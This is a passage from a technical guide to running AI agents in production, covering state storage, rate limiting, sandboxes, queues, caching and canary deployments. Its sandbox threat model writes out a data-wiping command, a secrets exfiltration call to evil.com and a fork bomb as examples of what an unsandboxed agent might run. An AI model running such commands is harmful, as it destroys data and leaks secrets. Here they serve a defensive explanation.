            json.dumps({**data, "checksum": checksum}),
        )

        # Cold storage in S3 (permanent, cheap)
        s3_key = f"checkpoints/{agent_id}/{conversation_id}/{step}.json"
        self.s3.put_object(
            Bucket=self.bucket,
            Key=s3_key,
            Body=json.dumps({**data, "checksum": checksum}),
        )

        return checkpoint

    async def load_latest(
        self, agent_id: str, conversation_id: str
    ) -> AgentCheckpoint | None:
        """Load the most recent checkpoint for an agent conversation."""
        # Try Redis first (hot path)
        pattern = f"checkpoint:{agent_id}:{conversation_id}:*"
        keys = await self.redis.keys(pattern)

        if keys:
            latest_key = sorted(keys)[-1]
            data = json.loads(await self.redis.get(latest_key))
            return AgentCheckpoint(
                **{
                    **data,
                    "messages": tuple(data["messages"]),
                    "pending_tool_calls": tuple(data["pending_tool_calls"]),
                }
            )

        # Fall back to S3 (cold path)
        return await self._load_from_s3(agent_id, conversation_id)

    async def _load_from_s3(
        self, agent_id: str, conversation_id: str
    ) -> AgentCheckpoint | None:
        prefix = f"checkpoints/{agent_id}/{conversation_id}/"
        response = self.s3.list_objects_v2(
            Bucket=self.bucket, Prefix=prefix
        )
        objects = response.get("Contents", [])
        if not objects:
            return None

        latest = sorted(objects, key=lambda x: x["Key"])[-1]
        obj = self.s3.get_object(Bucket=self.bucket, Key=latest["Key"])
        data = json.loads(obj["Body"].read())

        return AgentCheckpoint(
            **{
                **data,
                "messages": tuple(data["messages"]),
                "pending_tool_calls": tuple(data["pending_tool_calls"]),
            }
        )
```

### Database Choices for Agent State

```
DATABASE SELECTION GUIDE:

+------------------+-------------------+------------------------+
| Database         | Best For          | Agent Use Case         |
+------------------+-------------------+------------------------+
| Redis            | Hot state,        | Active conversation    |
|                  | sub-ms latency    | state, rate limiting,  |
|                  |                   | session data           |
+------------------+-------------------+------------------------+
| PostgreSQL       | Structured data,  | User accounts, agent   |
|                  | transactions,     | configs, audit logs,   |
|                  | complex queries   | conversation history   |
+------------------+-------------------+------------------------+
| DynamoDB/Cosmos  | Key-value at      | Conversation storage,  |
|                  | massive scale,    | checkpoints, session   |
|                  | auto-scaling      | state (serverless)     |
+------------------+-------------------+------------------------+
| S3/GCS           | Large blobs,      | Artifacts, full        |
|                  | cheap storage     | transcripts, backups   |
+------------------+-------------------+------------------------+
| Pinecone/        | Vector similarity | Long-term memory,      |
| Weaviate/pgvector| search            | semantic search over   |
|                  |                   | past conversations     |
+------------------+-------------------+------------------------+
| SQLite           | Embedded, local   | Local agent state,     |
|                  | single-process    | dev/testing, CLI tools |
+------------------+-------------------+------------------------+

TYPICAL PRODUCTION STACK:
  Redis (hot) + PostgreSQL (warm) + S3 (cold) + pgvector (memory)
```

### Session Persistence Pattern

```python
from contextlib import asynccontextmanager


class SessionManager:
    """
    Manages agent sessions with tiered storage.

    Hot:  Redis (active sessions, <1ms access)
    Warm: PostgreSQL (recent sessions, <10ms access)
    Cold: S3 (archived sessions, <100ms access)
    """

    def __init__(self, redis_client, db_pool, s3_client):
        self.redis = redis_client
        self.db = db_pool
        self.s3 = s3_client

    @asynccontextmanager
    async def session(self, session_id: str):
        """Load session, yield for use, then persist changes."""
        state = await self._load(session_id)
        try:
            yield state
        finally:
            await self._save(session_id, state)

    async def _load(self, session_id: str) -> dict:
        # Try hot storage first
        cached = await self.redis.get(f"session:{session_id}")
        if cached:
            return json.loads(cached)

        # Try warm storage
        async with self.db.acquire() as conn:
            row = await conn.fetchrow(
                "SELECT state FROM agent_sessions WHERE id = $1",
                session_id,
            )
            if row:
                state = json.loads(row["state"])
                # Promote back to hot storage
                await self.redis.setex(
                    f"session:{session_id}", 3600, row["state"]
                )
                return state

        # Try cold storage
        return await self._load_from_s3(session_id)

    async def _save(self, session_id: str, state: dict):
        serialized = json.dumps(state)

        # Always write to hot + warm
        await self.redis.setex(f"session:{session_id}", 3600, serialized)

        async with self.db.acquire() as conn:
            await conn.execute(
                """
                INSERT INTO agent_sessions (id, state, updated_at)
                VALUES ($1, $2, NOW())
                ON CONFLICT (id) DO UPDATE
                SET state = $2, updated_at = NOW()
                """,
                session_id,
                serialized,
            )
```

---

## 6. API Gateway for Agents

### Gateway Architecture

```
CLIENTS (Web, Mobile, CLI, API)
         |
         v
+--------+---------+
|   API Gateway    |
|                  |
| +-- Auth ------+ |
| | JWT / API Key| |
| +--------------+ |
|                  |
| +-- Rate Limit-+ |
| | Per user,    | |
| | per model    | |
| +--------------+ |
|                  |
| +-- Router ----+ |
| | /chat -> ws  | |
| | /agent -> q  | |
| | /batch -> q  | |
| +--------------+ |
|                  |
| +-- Logging ---+ |
| | Structured   | |
| | traces       | |
| +--------------+ |
+--------+---------+
         |
    +----+----+----+
    |         |    |
    v         v    v
 WebSocket  Queue  Batch
 Handler    Worker Processor
```

### Rate Limiting for Agents

Agent rate limiting is more nuanced than traditional API rate limiting. You need to limit by tokens, by cost, and by concurrent executions -- not just requests per second.

```python
import time
from dataclasses import dataclass


@dataclass(frozen=True)
class RateLimitConfig:
    requests_per_minute: int
    tokens_per_minute: int
    concurrent_agents: int
    daily_cost_limit_usd: float


# Tier-based limits
RATE_LIMITS = {
    "free": RateLimitConfig(
        requests_per_minute=10,
        tokens_per_minute=50_000,
        concurrent_agents=1,
        daily_cost_limit_usd=1.0,
    ),
    "pro": RateLimitConfig(
        requests_per_minute=60,
        tokens_per_minute=500_000,
        concurrent_agents=5,
        daily_cost_limit_usd=50.0,
    ),
    "enterprise": RateLimitConfig(
        requests_per_minute=300,
        tokens_per_minute=5_000_000,
        concurrent_agents=50,
        daily_cost_limit_usd=1000.0,
    ),
}


class AgentRateLimiter:
    """Multi-dimensional rate limiter for agent workloads."""

    def __init__(self, redis_client):
        self.redis = redis_client

    async def check_and_consume(
        self,
        user_id: str,
        tier: str,
        estimated_tokens: int,
    ) -> dict:
        config = RATE_LIMITS[tier]
        now = time.time()
        minute_window = int(now // 60)
        day_window = int(now // 86400)

        # Check all limits atomically using Redis pipeline
        pipe = self.redis.pipeline()

        rpm_key = f"rate:{user_id}:rpm:{minute_window}"
        tpm_key = f"rate:{user_id}:tpm:{minute_window}"
        conc_key = f"rate:{user_id}:concurrent"
        cost_key = f"rate:{user_id}:cost:{day_window}"

        pipe.get(rpm_key)
        pipe.get(tpm_key)
        pipe.scard(conc_key)
        pipe.get(cost_key)

        results = await pipe.execute()

        current_rpm = int(results[0] or 0)
        current_tpm = int(results[1] or 0)
        current_concurrent = int(results[2] or 0)
        current_cost = float(results[3] or 0)

        violations = []

        if current_rpm >= config.requests_per_minute:
            violations.append(
                f"Request rate: {current_rpm}/{config.requests_per_minute} per minute"
            )

        if current_tpm + estimated_tokens > config.tokens_per_minute:
            violations.append(
                f"Token rate: {current_tpm}/{config.tokens_per_minute} per minute"
            )

        if current_concurrent >= config.concurrent_agents:
            violations.append(
                f"Concurrent agents: {current_concurrent}/{config.concurrent_agents}"
            )

        if current_cost >= config.daily_cost_limit_usd:
            violations.append(
                f"Daily cost: ${current_cost:.2f}/${config.daily_cost_limit_usd}"
            )

        if violations:
            return {"allowed": False, "violations": violations}

        # Consume quota
        pipe = self.redis.pipeline()
        pipe.incr(rpm_key)
        pipe.expire(rpm_key, 120)
        pipe.incrby(tpm_key, estimated_tokens)
        pipe.expire(tpm_key, 120)
        await pipe.execute()

        return {"allowed": True, "violations": []}
```

### Load Balancing Strategy

```
AGENT-AWARE LOAD BALANCING:

Traditional:  Round-robin or least-connections
Problem:      Agent requests vary 100x in duration

Better approach: Weighted load balancing by active agent count

                    Load Balancer
                    (agent-aware)
                         |
          +--------------+--------------+
          |              |              |
     Worker A        Worker B       Worker C
     Active: 45      Active: 12     Active: 38
     CPU: 20%        CPU: 5%        CPU: 15%
     Memory: 60%     Memory: 20%    Memory: 50%
          |              |              |
     Next request   <--- routes here (least active agents)

Algorithm:
  score = active_agents * weight_agents +
          cpu_usage * weight_cpu +
          memory_usage * weight_memory

  Route to worker with lowest score.
```

### Request Routing

```python
from fastapi import FastAPI, WebSocket, Request, HTTPException
from fastapi.responses import JSONResponse

app = FastAPI()


@app.post("/v1/agent/invoke")
async def invoke_agent(request: Request):
    """Synchronous agent invocation -- blocks until complete."""
    body = await request.json()
    user = await authenticate(request)
    rate_check = await rate_limiter.check_and_consume(
        user.id, user.tier, estimated_tokens=5000
    )
    if not rate_check["allowed"]:
        raise HTTPException(429, detail=rate_check["violations"])

    result = await agent_pool.run_agent(user.id, body)
    return JSONResponse(result)


@app.post("/v1/agent/async")
async def invoke_agent_async(request: Request):
    """Async agent invocation -- returns job ID for polling."""
    body = await request.json()
    user = await authenticate(request)

    job_id = await job_queue.enqueue(
        user_id=user.id,
        request=body,
        priority=get_priority(user.tier),
    )

    return JSONResponse({
        "job_id": job_id,
        "status_url": f"/v1/agent/jobs/{job_id}",
    })


@app.get("/v1/agent/jobs/{job_id}")
async def get_job_status(job_id: str, request: Request):
    """Poll for async agent job status."""
    user = await authenticate(request)
    status = await job_queue.get_status(job_id)

    if status is None:
        raise HTTPException(404, detail="Job not found")

    return JSONResponse(status)


@app.websocket("/v1/agent/stream")
async def stream_agent(websocket: WebSocket):
    """WebSocket streaming agent -- real-time token streaming."""
    await websocket.accept()

    try:
        auth_msg = await websocket.receive_json()
        user = await authenticate_ws(auth_msg)

        while True:
            message = await websocket.receive_json()
            async for chunk in agent_stream(user.id, message):
                await websocket.send_json(chunk)
    except Exception:
        await websocket.close(code=1011)
```

---

## 7. Execution Sandboxes

### Why Agents Need Sandboxes

Agents that execute code, run shell commands, or interact with filesystems must be sandboxed. An unsandboxed agent with code execution is a remote code execution vulnerability.

```
THREAT MODEL:

User Input --> LLM --> Tool: "run_code" --> ???

Without sandbox:
  - LLM generates: os.system("rm -rf /")
  - LLM generates: requests.post("https://evil.com", data=secrets)
  - LLM generates: while True: fork()

With sandbox:
  - Isolated filesystem (can't access host)
  - Network restrictions (can't exfiltrate)
  - Resource limits (can't fork bomb)
  - Time limits (can't run forever)
```

### Sandbox Options Comparison

```
+----------------+----------+---------+----------+----------+----------+
| Feature        | Docker   | E2B     | Modal    | Fly.io   | Firecracker|
+----------------+----------+---------+----------+----------+----------+
| Isolation      | Process  | VM      | Container| VM       | microVM  |
| Startup time   | 1-5s     | <1s     | <1s      | 1-3s     | 125ms    |
| Persistence    | Volumes  | Session | Volumes  | Volumes  | None     |
| Network control| iptables | Policy  | Policy   | Policy   | VPC      |
| GPU support    | Yes      | Yes     | Yes      | No       | No       |
| Max lifetime   | Unlimited| 24h     | Unlimited| Unlimited| Unlimited|
| Pricing model  | Self-host| Per-sec | Per-sec  | Per-sec  | Self-host|
| Best for       | Self-    | Code    | ML/GPU   | Global   | High-sec |
|                | hosted   | agents  | workloads| deploy   | multi-   |
|                |          |         |          |          | tenant   |
+----------------+----------+---------+----------+----------+----------+
```

### E2B (Code Interpreter SDK)

E2B provides cloud sandboxes purpose-built for AI agents. Each sandbox is a microVM with a full Linux environment.

```python
from e2b_code_interpreter import Sandbox


class E2BSandboxExecutor:
    """Execute agent code in E2B sandboxes."""

    def __init__(self, api_key: str, template: str = "base"):
        self.api_key = api_key
        self.template = template

    async def execute_code(
        self,
        code: str,
        language: str = "python",
        timeout: int = 30,
    ) -> dict:
        sandbox = Sandbox(
            api_key=self.api_key,
            template=self.template,
        )

        try:
            execution = sandbox.run_code(code, language=language)

            return {
                "stdout": execution.text,
                "stderr": execution.error,
                "results": [
                    {"type": r.type, "data": r.data}
                    for r in execution.results
                ],
                "exit_code": 0 if not execution.error else 1,
            }
        except Exception as e:
            return {
                "stdout": "",
                "stderr": str(e),
                "results": [],
                "exit_code": 1,
            }
        finally:
            sandbox.kill()

    async def execute_with_files(
        self,
        code: str,
        files: dict[str, bytes],
    ) -> dict:
        """Upload files, execute code, download results."""
        sandbox = Sandbox(api_key=self.api_key)

        try:
            # Upload input files
            for path, content in files.items():
                sandbox.files.write(path, content)

            execution = sandbox.run_code(code)

            # Download output files
            output_files = {}
            for path in sandbox.files.list("/home/user/output"):
                content = sandbox.files.read(f"/home/user/output/{path.name}")
                output_files[path.name] = content

            return {
                "stdout": execution.text,
                "files": output_files,
                "exit_code": 0,
            }
        finally:
            sandbox.kill()
```

### Docker-Based Sandboxes (Self-Hosted)

```python
import docker
import asyncio
from dataclasses import dataclass


@dataclass(frozen=True)
class SandboxConfig:
    image: str = "python:3.12-slim"
    memory_limit: str = "256m"
    cpu_quota: int = 50000  # 50% of one CPU
    network_disabled: bool = True
    timeout_seconds: int = 30
    read_only_rootfs: bool = True


class DockerSandbox:
    """Self-hosted Docker sandbox for code execution."""

    def __init__(self, config: SandboxConfig | None = None):
        self.config = config or SandboxConfig()
        self.client = docker.from_env()

    async def execute(self, code: str) -> dict:
        container = None
        try:
            container = self.client.containers.run(
                self.config.image,
                command=["python", "-c", code],
                mem_limit=self.config.memory_limit,
                cpu_quota=self.config.cpu_quota,
                network_disabled=self.config.network_disabled,
                read_only=self.config.read_only_rootfs,
                tmpfs={"/tmp": "size=64m"},
                detach=True,
                remove=False,
                # Security options
                security_opt=["no-new-privileges"],
                cap_drop=["ALL"],
            )

            # Wait with timeout
            result = container.wait(timeout=self.config.timeout_seconds)
            logs = container.logs(stdout=True, stderr=True).decode()

            return {
                "output": logs,
                "exit_code": result["StatusCode"],
                "error": None if result["StatusCode"] == 0 else logs,
            }

        except docker.errors.ContainerError as e:
            return {
                "output": "",
                "exit_code": e.exit_status,
                "error": str(e),
            }
        except Exception as e:
            return {
                "output": "",
                "exit_code": -1,
                "error": f"Sandbox error: {e}",
            }
        finally:
            if container:
                try:
                    container.remove(force=True)
                except Exception:
                    pass
```

### Firecracker MicroVMs

Firecracker (used by AWS Lambda and Fly.io under the hood) provides the strongest isolation with VM-level security and near-instant startup.

```
FIRECRACKER ARCHITECTURE:

Host OS
+--------------------------------------------------+
|                                                  |
|  +-------------+  +-------------+  +----------+ |
|  | microVM 1   |  | microVM 2   |  | microVM N| |
|  | Agent A     |  | Agent B     |  | Agent N  | |
|  |             |  |             |  |          | |
|  | Guest kernel|  | Guest kernel|  | Guest    | |
|  | (stripped)  |  | (stripped)  |  | kernel   | |
|  +------+------+  +------+------+  +----+-----+ |
|         |                |               |       |
|  +------+------+  +------+------+  +----+-----+ |
|  | Firecracker |  | Firecracker |  |Firecracker| |
|  | VMM process |  | VMM process |  |VMM process| |
|  +------+------+  +------+------+  +----+-----+ |
|         |                |               |       |
|  +------+------+  +------+------+  +----+-----+ |
|  |  jailer     |  |  jailer     |  | jailer   | |
|  | (seccomp +  |  | (seccomp +  |  |(seccomp +| |
|  |  cgroups)   |  |  cgroups)   |  | cgroups) | |
|  +-------------+  +-------------+  +----------+ |
|                                                  |
+--------------------------------------------------+

Properties:
  - Boot time: ~125ms
  - Memory overhead: ~5MB per VM
  - Full Linux kernel per VM
  - Hardware-level isolation (KVM)
  - No shared kernel with host (unlike containers)
```

### Sandbox Selection Guide

```
START
  |
  v
Multi-tenant with untrusted code?
  |                    |
  YES                  NO
  |                    |
  v                    v
Need GPU?          Need instant startup?
  |       |            |           |
  YES     NO           YES         NO
  |       |            |           |
  v       v            v           v
Modal   Firecracker  E2B         Docker
        microVMs     (managed)   (simple)
```

---

## 8. Message Queues and Event Systems

### Why Queues Matter for Agents

Agents are inherently asynchronous workloads. A queue decouples the request from execution, enabling:

1. **Backpressure handling** -- Don't overwhelm LLM APIs
2. **Priority management** -- Paying users go first
3. **Retry with state** -- Resume failed agents from checkpoints
4. **Fan-out** -- One event triggers multiple agents
5. **Rate smoothing** -- Absorb traffic spikes

```
WITHOUT QUEUE:                    WITH QUEUE:

Spike of 1000 requests            Spike of 1000 requests
        |                                 |
        v                                 v
   All hit LLM API               Queued, processed at
   simultaneously                 sustainable rate
        |                                 |
        v                                 v
   429 Rate Limit                 All complete within
   Errors for 800                 minutes, zero errors
```

### Event-Driven Agent Architecture

```
+------------+
| User Event |  (HTTP request, webhook, schedule)
+-----+------+
      |
      v
+-----+--------+
| Event Router |
+-----+--------+
      |
      +------------+-------------+
      |            |             |
      v            v             v
+---------+  +----------+  +---------+
| Queue:  |  | Queue:   |  | Queue:  |
| chat    |  | batch    |  | webhook |
| (high   |  | (low     |  | (medium |
| priority)|  | priority)|  | priority)|
+---------+  +----------+  +---------+
      |            |             |
      v            v             v
+-----+---+  +----+----+  +----+-----+
| Chat    |  | Batch   |  | Webhook  |
| Agent   |  | Agent   |  | Agent    |
| Workers |  | Workers |  | Workers  |
+---------+  +---------+  +----------+
      |            |             |
      v            v             v
+-----+------------+-------------+-----+
|           Result Store               |
| (Redis for status, S3 for artifacts)|
+--------------------------------------+
```

```python
# Event-driven agent system with RabbitMQ
import aio_pika
import json
from enum import Enum


class EventType(str, Enum):
    CHAT_MESSAGE = "chat.message"
    FILE_UPLOADED = "file.uploaded"
    SCHEDULE_TRIGGER = "schedule.trigger"
    WEBHOOK_RECEIVED = "webhook.received"
    AGENT_STEP_COMPLETE = "agent.step.complete"
    AGENT_FAILED = "agent.failed"


class AgentEventBus:
    """Pub/sub event bus for agent orchestration."""

    def __init__(self, rabbitmq_url: str):
        self.url = rabbitmq_url
        self.handlers: dict[str, list] = {}

    async def connect(self):
        self.connection = await aio_pika.connect_robust(self.url)
        self.channel = await self.connection.channel()

        # Declare exchange for fan-out
        self.exchange = await self.channel.declare_exchange(
            "agent_events",
            aio_pika.ExchangeType.TOPIC,
            durable=True,
        )

    async def publish(self, event_type: EventType, payload: dict):
        message = aio_pika.Message(
            body=json.dumps({
                "type": event_type.value,
                "payload": payload,
            }).encode(),
            delivery_mode=aio_pika.DeliveryMode.PERSISTENT,
        )
        await self.exchange.publish(
            message,
            routing_key=event_type.value,
        )

    async def subscribe(self, pattern: str, handler):
        """
        Subscribe to events matching a pattern.
        Examples:
          "chat.*"           -- all chat events
          "agent.#"          -- all agent events
          "*.failed"         -- all failure events
        """
        queue = await self.channel.declare_queue(exclusive=True)
        await queue.bind(self.exchange, routing_key=pattern)

        async with queue.iterator() as queue_iter:
            async for message in queue_iter:
                async with message.process():
                    event = json.loads(message.body)
                    await handler(event)


# Usage: Agent step completion triggers next step
async def on_step_complete(event: dict):
    """When an agent completes a step, decide what happens next."""
    agent_id = event["payload"]["agent_id"]
    step = event["payload"]["step"]
    result = event["payload"]["result"]

    if result["needs_more_steps"]:
        # Re-queue for next step
        await event_bus.publish(
            EventType.CHAT_MESSAGE,
            {
                "agent_id": agent_id,
                "step": step + 1,
                "context": result["context"],
            },
        )
    else:
        # Agent complete -- notify user
        await notify_user(agent_id, result["final_response"])
```

### Priority Queue Pattern

```python
# Priority-based agent job queue
import heapq
import asyncio
from dataclasses import dataclass, field
from typing import Any


@dataclass(order=True)
class PriorityJob:
    priority: int
    timestamp: float = field(compare=False)
    job_data: dict = field(compare=False)


class PriorityAgentQueue:
    """
    Priority queue for agent jobs.

    Priority levels:
      0 = Critical (system alerts, paid users hitting issues)
      1 = High     (enterprise tier real-time requests)
      2 = Medium   (pro tier requests)
      3 = Low      (free tier, batch jobs)
    """

    def __init__(self):
        self.heap: list[PriorityJob] = []
        self.condition = asyncio.Condition()

    async def enqueue(self, job_data: dict, priority: int = 2):
        async with self.condition:
            job = PriorityJob(
                priority=priority,
                timestamp=asyncio.get_event_loop().time(),
                job_data=job_data,
            )
            heapq.heappush(self.heap, job)
            self.condition.notify()

    async def dequeue(self) -> dict:
        async with self.condition:
            while not self.heap:
                await self.condition.wait()
            job = heapq.heappop(self.heap)
            return job.job_data

    @property
    def size(self) -> int:
        return len(self.heap)
```

---

## 9. Caching Strategies

### Cache Layers for Agent Systems

```
REQUEST
   |
   v
+--+------------------+
| L1: Exact Match     |  Hit rate: 5-15%
| (hash of input)     |  Latency: <1ms
+--+------------------+
   | MISS
   v
+--+------------------+
| L2: Semantic Cache  |  Hit rate: 15-30%
| (embedding sim.)    |  Latency: 5-20ms
+--+------------------+
   | MISS
   v
+--+------------------+
| L3: Tool Result     |  Hit rate: 20-50%
| Cache (per-tool)    |  Latency: 1-10ms
+--+------------------+
   | MISS
   v
+--+------------------+
| L4: LLM Response    |  (no cache, full inference)
| (model inference)   |  Latency: 1-10s
+--+------------------+
```

### Semantic Caching

Semantic caching uses embedding similarity to find cached responses for queries that are semantically similar but not textually identical.

```python
import hashlib
import json
import numpy as np
from dataclasses import dataclass
from datetime import datetime, timezone


@dataclass(frozen=True)
class CacheEntry:
    query: str
    response: str
    embedding: tuple  # Immutable
    timestamp: str
    hit_count: int
    model: str


class SemanticCache:
    """
    Cache LLM responses by semantic similarity.

    "What is the capital of France?" and
    "Tell me France's capital city" should be cache hits.
    """

    def __init__(
        self,
        embedding_model,
        similarity_threshold: float = 0.95,
        max_entries: int = 10000,
        ttl_seconds: int = 3600,
    ):
        self.embedding_model = embedding_model
        self.threshold = similarity_threshold
        self.max_entries = max_entries
        self.ttl = ttl_seconds
        self.entries: list[CacheEntry] = []

    async def get(self, query: str, model: str) -> str | None:
        query_embedding = await self._embed(query)

        best_match = None
        best_similarity = 0.0

        for entry in self.entries:
            if entry.model != model:
                continue

            if self._is_expired(entry):
                continue

            similarity = self._cosine_similarity(
                query_embedding, entry.embedding
            )

            if similarity > best_similarity:
                best_similarity = similarity
                best_match = entry

        if best_match and best_similarity >= self.threshold:
            return best_match.response

        return None

    async def put(self, query: str, response: str, model: str):
        embedding = await self._embed(query)

        entry = CacheEntry(
            query=query,
            response=response,
            embedding=tuple(embedding),
            timestamp=datetime.now(timezone.utc).isoformat(),
            hit_count=0,
            model=model,
        )

        self.entries.append(entry)

        # Evict if over capacity (LRU by timestamp)
        if len(self.entries) > self.max_entries:
            self.entries.sort(key=lambda e: e.timestamp)
            self.entries = self.entries[-self.max_entries:]

    def _cosine_similarity(self, a: tuple, b: tuple) -> float:
        a_arr = np.array(a)
        b_arr = np.array(b)
        return float(np.dot(a_arr, b_arr) / (
            np.linalg.norm(a_arr) * np.linalg.norm(b_arr)
        ))

    def _is_expired(self, entry: CacheEntry) -> bool:
        created = datetime.fromisoformat(entry.timestamp)
        age = (datetime.now(timezone.utc) - created).total_seconds()
        return age > self.ttl

    async def _embed(self, text: str) -> list[float]:
        return await self.embedding_model.embed(text)
```

### Tool Result Caching

Tool results are often the best caching target because tool calls are expensive, slow, and frequently repeated.

```python
import hashlib
import json
from functools import wraps


class ToolResultCache:
    """
    Cache tool results with configurable TTLs per tool.

    Some tools are highly cacheable (search, read_file)
    while others should never be cached (create_file, send_email).
    """

    CACHE_CONFIG = {
        "search_docs": {"ttl": 300, "cacheable": True},
        "read_file": {"ttl": 60, "cacheable": True},
        "get_weather": {"ttl": 1800, "cacheable": True},
        "run_query": {"ttl": 30, "cacheable": True},
        "create_file": {"ttl": 0, "cacheable": False},
        "send_email": {"ttl": 0, "cacheable": False},
        "delete_record": {"ttl": 0, "cacheable": False},
    }

    def __init__(self, redis_client):
        self.redis = redis_client

    def cacheable(self, tool_name: str):
        """Decorator to add caching to a tool function."""
        config = self.CACHE_CONFIG.get(
            tool_name, {"ttl": 0, "cacheable": False}
        )

        def decorator(func):
            @wraps(func)
            async def wrapper(input_data: dict) -> str:
                if not config["cacheable"]:
                    return await func(input_data)

                cache_key = self._make_key(tool_name, input_data)
                cached = await self.redis.get(cache_key)

                if cached:
                    return cached.decode()

                result = await func(input_data)

                await self.redis.setex(
                    cache_key,
                    config["ttl"],
                    result,
                )

                return result

            return wrapper
        return decorator

    def _make_key(self, tool_name: str, input_data: dict) -> str:
        data_hash = hashlib.sha256(
            json.dumps(input_data, sort_keys=True).encode()
        ).hexdigest()[:16]
        return f"tool_cache:{tool_name}:{data_hash}"


# Usage
cache = ToolResultCache(redis_client)


@cache.cacheable("search_docs")
async def search_docs(input_data: dict) -> str:
    results = await doc_index.search(input_data["query"])
    return json.dumps(results)


@cache.cacheable("read_file")
async def read_file(input_data: dict) -> str:
    with open(input_data["path"]) as f:
        return f.read()
```

### Conversation History Caching

```python
class ConversationCache:
    """
    Cache conversation context to avoid re-loading from database.

    Uses Redis with a sliding window TTL -- conversations that are
    actively used stay cached; idle ones expire.
    """

    def __init__(self, redis_client, ttl: int = 3600):
        self.redis = redis_client
        self.ttl = ttl

    async def get_messages(self, conversation_id: str) -> list[dict] | None:
        key = f"conv:{conversation_id}:messages"
        data = await self.redis.get(key)

        if data:
            # Extend TTL on access (sliding window)
            await self.redis.expire(key, self.ttl)
            return json.loads(data)

        return None

    async def append_message(
        self, conversation_id: str, message: dict
    ):
        key = f"conv:{conversation_id}:messages"
        existing = await self.redis.get(key)

        if existing:
            messages = json.loads(existing)
        else:
            messages = []

        # Create new list (immutable pattern)
        updated = [*messages, message]

        await self.redis.setex(
            key,
            self.ttl,
            json.dumps(updated),
        )

    async def invalidate(self, conversation_id: str):
        await self.redis.delete(f"conv:{conversation_id}:messages")
```

### Cache Effectiveness by Layer

```
+-------------------+----------+----------+------------+
| Cache Layer       | Hit Rate | Savings  | Complexity |
+-------------------+----------+----------+------------+
| Exact match       | 5-15%    | ~10%     | Low        |
| Semantic cache    | 15-30%   | ~25%     | Medium     |
| Tool result cache | 20-50%   | ~15%     | Low        |
| Conversation cache| 80-95%   | DB load  | Low        |
+-------------------+----------+----------+------------+
| Combined          | -        | 30-50%   | Medium     |
+-------------------+----------+----------+------------+
```

---

## 10. Deployment Patterns

### Blue/Green Deployment for Agents

Blue/green deployments are particularly important for agents because:

- Agent behavior changes are hard to predict from code diffs alone
- Prompt or model changes can silently degrade quality
- Rollback must be instant because bad agent behavior compounds

```
BLUE/GREEN DEPLOYMENT:

              Load Balancer
                   |
          +--------+--------+
          |                 |
    +-----+-----+    +-----+-----+
    |   BLUE    |    |   GREEN   |
    | (current) |    | (new ver) |
    |           |    |           |
    | v2.3.1    |    | v2.4.0    |
    | Sonnet    |    | Sonnet    |
    | prompt-v7 |    | prompt-v8 |
    +-----------+    +-----------+
         |                |
    100% traffic     0% traffic
                     (staging tests
                      running)

AFTER VALIDATION:

              Load Balancer
                   |
          +--------+--------+
          |                 |
    +-----+-----+    +-----+-----+
    |   BLUE    |    |   GREEN   |
    | (standby) |    | (current) |
    |           |    |           |
    | v2.3.1    |    | v2.4.0    |
    +-----------+    +-----------+
         |                |
    0% traffic       100% traffic

ROLLBACK: Flip back to Blue in <1 second
```

### Canary Releases

Route a small percentage of traffic to the new version and monitor quality metrics before full rollout.

```python
import random
from dataclasses import dataclass


@dataclass(frozen=True)
class AgentVersion:
    version: str
    model: str
    system_prompt: str
    tools: tuple
    config: dict


class CanaryRouter:
    """
    Route traffic between stable and canary agent versions.

    Automatically rolls back if quality metrics degrade.
    """

    def __init__(
        self,
        stable: AgentVersion,
        canary: AgentVersion,
        canary_percentage: float = 5.0,
    ):
        self.stable = stable
        self.canary = canary
        self.canary_pct = canary_percentage
        self.metrics = CanaryMetrics()

    def route(self, user_id: str) -> AgentVersion:
        """
        Deterministic routing based on user_id.
        Same user always gets the same version for consistency.
        """
        hash_val = hash(user_id) % 100

        if hash_val < self.canary_pct:
            return self.canary

        return self.stable

    async def record_result(
        self,
        version: AgentVersion,
        success: bool,
        latency_ms: float,
        cost_usd: float,
        user_rating: int | None = None,
    ):
        self.metrics.record(version.version, success, latency_ms, cost_usd, user_rating)

        # Auto-rollback if canary is degraded
        if self.metrics.should_rollback(
            self.stable.version, self.canary.version
        ):
            self.canary_pct = 0.0  # Kill canary traffic

    async def promote_canary(self):
        """Promote canary to stable after validation."""
        self.stable = self.canary
        self.canary_pct = 0.0


class CanaryMetrics:
    """Track metrics for canary comparison."""

    def __init__(self):
        self.data: dict[str, list] = {}

    def record(
        self,
        version: str,
        success: bool,
        latency_ms: float,
        cost_usd: float,
        user_rating: int | None,
    ):
        if version not in self.data:
            self.data[version] = []

        self.data[version].append({
            "success": success,
            "latency_ms": latency_ms,
            "cost_usd": cost_usd,
            "user_rating": user_rating,
        })

    def should_rollback(
        self, stable_version: str, canary_version: str
    ) -> bool:
        stable_data = self.data.get(stable_version, [])
        canary_data = self.data.get(canary_version, [])

        if len(canary_data) < 50:
            return False  # Not enough data

        stable_success_rate = (
            sum(1 for d in stable_data if d["success"]) / len(stable_data)
            if stable_data else 1.0
        )
        canary_success_rate = (
            sum(1 for d in canary_data if d["success"]) / len(canary_data)
        )

        # Roll back if canary success rate is >5% lower
        return canary_success_rate < stable_success_rate - 0.05
```

### Feature Flags for Agent Capabilities

```python
from dataclasses import dataclass


@dataclass(frozen=True)
class AgentFeatureFlags:
    """Feature flags for gradual agent capability rollout."""
    enable_code_execution: bool = False
    enable_web_search: bool = True
    enable_file_upload: bool = False
    max_agent_steps: int = 10
    model_override: str | None = None
    enable_parallel_tools: bool = True
    enable_semantic_cache: bool = True
    system_prompt_version: str = "v7"


class FeatureFlagService:
    """
    Feature flag service with user/org targeting.

    Allows:
    - Gradual rollout by percentage
    - User-level overrides
    - Organization-level policies
    - Kill switches for dangerous features
    """

    def __init__(self, config_store):
        self.store = config_store

    async def get_flags(
        self, user_id: str, org_id: str | None = None
    ) -> AgentFeatureFlags:
        # Load defaults
        defaults = await self.store.get("defaults")

        # Apply org overrides
        org_overrides = {}
        if org_id:
            org_overrides = await self.store.get(f"org:{org_id}") or {}

        # Apply user overrides
        user_overrides = await self.store.get(f"user:{user_id}") or {}

        # Merge: defaults < org < user
        merged = {**defaults, **org_overrides, **user_overrides}

        return AgentFeatureFlags(**{
            k: v for k, v in merged.items()
            if k in AgentFeatureFlags.__dataclass_fields__
        })
```

### Deployment Pipeline

```
CODE CHANGE
     |
     v
+---------+     +---------+     +---------+     +---------+
|  Build  |---->|  Test   |---->| Staging |---->| Canary  |
|  & Lint |     |  Suite  |     | Deploy  |     | (5%)    |
+---------+     +---------+     +---------+     +----+----+
                                                     |
                                              Monitor 1-4h
                                                     |
                                          +-----------+-----------+
                                          |                       |
